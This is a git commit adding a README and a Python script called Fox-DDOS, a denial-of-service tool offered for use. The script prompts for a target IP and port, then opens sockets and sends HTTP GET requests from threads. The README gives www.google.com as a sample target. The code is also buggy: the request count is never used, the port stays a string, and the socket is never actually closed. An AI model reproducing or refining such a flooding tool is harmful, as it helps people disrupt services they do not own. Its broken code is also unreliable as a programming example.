767cc892ff21f9efb658ae3acd507e08333f514b
ALiReZa-VaKeR <sec_x0x@yahoo.com>
2022-06-15 21:07:33 +0430

    Add File from PC to Project on Github repository

--- README.md
+++ README.md
@@ -1,2 +1,47 @@
-# Fox-DDOS
+# Fox-DDOS (v.1.0)
+
+## Table of Contents
+
+- [About](#about)
+- [Getting Started](#getting_started)
+- [Usage](#usage)
+
+## About <a name = "about"></a>
+
 A simple yet efficient and powerful script written in Python.
+
+## Getting Started <a name = "getting_started"></a>
+
+ If you are using Windows, you must first install Python to run this script.
+
+ <a href="https://www.python.org/downloads/">Download Python</a>
+
+If you use Kali, you do not need to download Python
+
+
+### Prerequisites
+
+For convenience, the prerequisites are written in the requirements.txt file. Just write the following command in <b> CMD </b> to install the required packages for you.
+
+```
+python -m pip install -r requirements.txt
+```
+
+ 
+## Usage <a name = "usage"></a>
+
+##### Notes
+The default port is 80
+
+To enter the address, be sure to enter this way.
+
+```
+www.google.com
+```
+#### Run Script
+
+Example: 
+```
+python foxDdos.py
+```
+<b>Good luck ...</b>
---
+++ foxDdos.py
@@ -0,0 +1,77 @@
+ 
+import socket
+import os
+from colorama import Fore, init
+import threading
+import time
+import sys
+
+init()
+# Variables
+Counter = 0
+DefaultPort = 80
+Reset = Fore.RESET
+
+
+def banner():
+
+    os.system("cls" or "clear")
+    print(Fore.CYAN+"""
+                                                    ███████╗ ██████╗ ██╗  ██╗    ██████╗ ██████╗  ██████╗ ███████╗
+                                                    ██╔════╝██╔═══██╗╚██╗██╔╝    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
+                                                    █████╗  ██║   ██║ ╚███╔╝     ██║  ██║██║  ██║██║   ██║███████╗
+                                                    ██╔══╝  ██║   ██║ ██╔██╗     ██║  ██║██║  ██║██║   ██║╚════██║
+                                                    ██║     ╚██████╔╝██╔╝ ██╗    ██████╔╝██████╔╝╚██████╔╝███████║
+                                                    ╚═╝      ╚═════╝ ╚═╝  ╚═╝    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
+                                                                        Coded By: ALiReZa-VaKeR
+                                                                            IranAnonymous.com
+                                                                                V 1.0
+    """+Reset)
+
+
+banner()
+# INPUTS
+Target = input(Fore.GREEN+"Enter the target IP => "+Reset)
+
+Port = input(Fore.GREEN+"Enter the target port (Default: 80) => "+Reset)
+
+Request_Number = int(input(Fore.GREEN+"Enter your request number => "+Reset))
+
+# Check port Number
+if(not Port):
+    Port = DefaultPort
+
+
+def Attack():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((Target, Port))
+        s.sendto(("GET /"+Target+"HTTP/1.1\r\n").encode("ascii"), (Target, Port))
+        s.sendto(("Host : "+Target+"\r\n\r\n").encode("ascii"), (Target, Port))
+
+        global Counter
+        Counter += 1
+
+        print(f"{Fore.GREEN} Packet {str(Counter)} sent! {Reset}")
+
+        s.close
+    except:
+        print(Fore.RED+"There is an error in the Attack!", Reset)
+
+
+# Progress
+for i in range(5):
+
+    sys.stdout.write(Fore.LIGHTBLUE_EX+"[%-1s] %d%%" % ('#'*i, 20*i)+Reset)
+
+    sys.stdout.write('\n')
+
+    time.sleep(0.20)
+
+print("Start Attack...")
+try:
+    for i in range(2):
+        thread = threading.Thread(target=Attack)
+        thread.start()
+except:
+    print(Fore.RED+"There is an error in the Loop!", Reset)
